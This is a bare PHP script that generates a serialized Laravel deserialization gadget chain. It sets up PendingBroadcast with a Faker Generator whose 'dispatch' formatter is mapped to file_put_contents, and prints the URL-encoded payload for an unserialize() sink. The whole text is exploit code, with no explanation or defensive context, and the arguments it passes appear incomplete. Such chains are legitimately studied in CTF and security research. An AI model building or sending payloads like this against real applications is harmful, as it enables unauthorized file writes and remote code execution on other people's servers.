<?php
namespace Faker{
    class Generator
    {
        protected $formatters = array();
        public function __construct($formatters){
            $this->formatters = $formatters;
        }
    }
}


namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace{
    use Illuminate\Broadcasting\PendingBroadcast;
    use Faker\Generator;
    $b = new Generator(array('dispatch'=>'file_put_contents'));
    $a = new PendingBroadcast($b, array(""));
    echo urlencode(serialize($a));
}
